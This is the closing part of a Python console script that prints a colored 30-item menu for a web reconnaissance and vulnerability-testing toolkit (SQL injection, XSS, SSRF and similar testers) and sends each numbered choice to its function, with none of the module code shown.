    print(f"{Fore.CYAN}       [{Fore.WHITE}01{Fore.CYAN}] {Fore.WHITE}URL Crawler{Fore.CYAN}        [{Fore.WHITE}11{Fore.CYAN}] {Fore.WHITE}Port Scanner{Fore.CYAN}        [{Fore.WHITE}21{Fore.CYAN}] {Fore.WHITE}Wayback URL Extractor{Fore.CYAN}")
    print(f"{Fore.CYAN}       [{Fore.WHITE}02{Fore.CYAN}] {Fore.WHITE}Subdomain Finder{Fore.CYAN}   [{Fore.WHITE}12{Fore.CYAN}] {Fore.WHITE}LFI/RFI Scanner{Fore.CYAN}     [{Fore.WHITE}22{Fore.CYAN}] {Fore.WHITE}Parameter Pollution Tester{Fore.CYAN}")
    print(f"{Fore.CYAN}       [{Fore.WHITE}03{Fore.CYAN}] {Fore.WHITE}CMS Detector{Fore.CYAN}       [{Fore.WHITE}13{Fore.CYAN}] {Fore.WHITE}CORS Checker{Fore.CYAN}        [{Fore.WHITE}23{Fore.CYAN}] {Fore.WHITE}Sitemap & robots.txt Parser{Fore.CYAN}")
    print(f"{Fore.CYAN}       [{Fore.WHITE}04{Fore.CYAN}] {Fore.WHITE}Headers Analyzer{Fore.CYAN}   [{Fore.WHITE}14{Fore.CYAN}] {Fore.WHITE}Open Redirect Tester{Fore.CYAN}[{Fore.WHITE}24{Fore.CYAN}] {Fore.WHITE}JavaScript Secrets Finder{Fore.CYAN}")
    print(f"{Fore.CYAN}       [{Fore.WHITE}05{Fore.CYAN}] {Fore.WHITE}HTTP Request Sender{Fore.CYAN}[{Fore.WHITE}15{Fore.CYAN}] {Fore.WHITE}SSRF Tester{Fore.CYAN}         [{Fore.WHITE}25{Fore.CYAN}] {Fore.WHITE}Host Header Injection Tester{Fore.CYAN}")
    print(f"{Fore.CYAN}       [{Fore.WHITE}06{Fore.CYAN}] {Fore.WHITE}Form Scanner{Fore.CYAN}       [{Fore.WHITE}16{Fore.CYAN}] {Fore.WHITE}CSP Analyzer{Fore.CYAN}        [{Fore.WHITE}26{Fore.CYAN}] {Fore.WHITE}Redirect Chain Tracer{Fore.CYAN}")
    print(f"{Fore.CYAN}       [{Fore.WHITE}07{Fore.CYAN}] {Fore.WHITE}SQL Injections Test{Fore.CYAN}[{Fore.WHITE}17{Fore.CYAN}] {Fore.WHITE}JS Endpoint Scanner{Fore.CYAN} [{Fore.WHITE}27{Fore.CYAN}] {Fore.WHITE}JWT Token Analyzer{Fore.CYAN}")
    print(f"{Fore.CYAN}       [{Fore.WHITE}08{Fore.CYAN}] {Fore.WHITE}XSS Tester{Fore.CYAN}         [{Fore.WHITE}18{Fore.CYAN}] {Fore.WHITE}Exposed Files Finder{Fore.CYAN}[{Fore.WHITE}28{Fore.CYAN}] {Fore.WHITE}CVE Version Scanner{Fore.CYAN}")
    print(f"{Fore.CYAN}       [{Fore.WHITE}09{Fore.CYAN}] {Fore.WHITE}Open Dir Finder{Fore.CYAN}    [{Fore.WHITE}19{Fore.CYAN}] {Fore.WHITE}403 Bypasser{Fore.CYAN}        [{Fore.WHITE}29{Fore.CYAN}] {Fore.WHITE}WAF Detector{Fore.CYAN}")
    print(f"{Fore.CYAN}       [{Fore.WHITE}10{Fore.CYAN}] {Fore.WHITE}WordPress Scanner{Fore.CYAN}  [{Fore.WHITE}20{Fore.CYAN}] {Fore.WHITE}JSONP Callback Scan{Fore.CYAN} [{Fore.WHITE}30{Fore.CYAN}] {Fore.WHITE}HTTP Response Time Analyzer{Fore.CYAN}")
    print('')
    print(f"{Fore.CYAN}       [{Fore.WHITE}98{Fore.CYAN}] {Fore.WHITE}Tool Info Center{Fore.CYAN}")
    print(f"{Fore.CYAN}       [{Fore.WHITE}99{Fore.CYAN}] {Fore.WHITE}Exit{Fore.CYAN}")

    print('')

    choice = input(Fore.CYAN + '       [?]> ' + Fore.WHITE).lstrip('0')

    if choice == '1':
       url_crawler()
    elif choice == '2':
        subdomain_finder()
    elif choice == '3':
        cms_tech_detector()
    elif choice == '4':
        headers_cookies_analyzer()
    elif choice == '5':
        request_sender()
    elif choice == '6':
        form_scanner()
    elif choice == '7':
        sqli_tester()
    elif choice == '8':
        xss_tester()
    elif choice == '9':
        dir_bruteforcer()
    elif choice == '10':
        wordpress_scanner()
    elif choice == '11':
        port_scanner()
    elif choice == '12':
        lfi_rfi_scanner()
    elif choice == '13':
        cors_checker()
    elif choice == '14':
        open_redirect_tester()
    elif choice == '15':
        ssrf_tester()
    elif choice == '16':
        csp_analyzer()
    elif choice == '17':
        js_endpoint_extractor()
    elif choice == '18':
        exposed_files_finder()
    elif choice == '19':
        bypass_403_tester()
    elif choice == '20':
        jsonp_finder()
    elif choice == '21':
        wayback_url_extractor()
    elif choice == '22':
        parameter_pollution_tester()
    elif choice == '23':
        sitemap_robots_parser()
    elif choice == '24':
        js_secrets_finder()
    elif choice == '25':
        host_header_injection()
    elif choice == '26':
        redirect_chain_tracer()
    elif choice == '27':
        jwt_token_analyzer()
    elif choice == '28':
        cve_version_scanner()
    elif choice == '29':
        waf_detector()
    elif choice == '30':
        http_response_time_analyzer()
    elif choice == '98':
        tool_info_center()
    elif choice == '99':
        print(Fore.GREEN + "       Goodbye!" + Fore.RESET)
        sys.exit()
    else:
        print(Fore.RED + "       Invalid choice. Returning to main menu...")
        time.sleep(2)
        main_menu()

# Start
clear()
main_menu()